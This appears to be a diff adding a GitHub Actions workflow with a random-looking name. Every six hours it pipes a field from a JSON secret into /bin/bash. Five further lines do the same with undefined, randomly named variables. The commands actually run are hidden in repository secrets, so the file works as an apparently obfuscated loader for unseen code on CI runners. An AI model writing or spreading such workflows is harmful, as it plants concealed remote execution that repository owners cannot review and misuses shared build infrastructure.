@@ -1,0 +1,22 @@
+name: frivolouswhirr
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: frivolouswhirr
+        env:
+          h2: ${{ secrets.h2 }}
+        run: |
+          echo $h2 | jq -r .pj21026 | /bin/bash
+          echo $k40940 | jq -r .x31810 | /bin/bash
+          echo $uw98295 | jq -r .kg5294 | /bin/bash
+          echo $z8 | jq -r .j88 | /bin/bash
+          echo $hvlqz2 | jq -r .la260 | /bin/bash
+          echo $xz76890 | jq -r .iqblt3 | /bin/bash
+
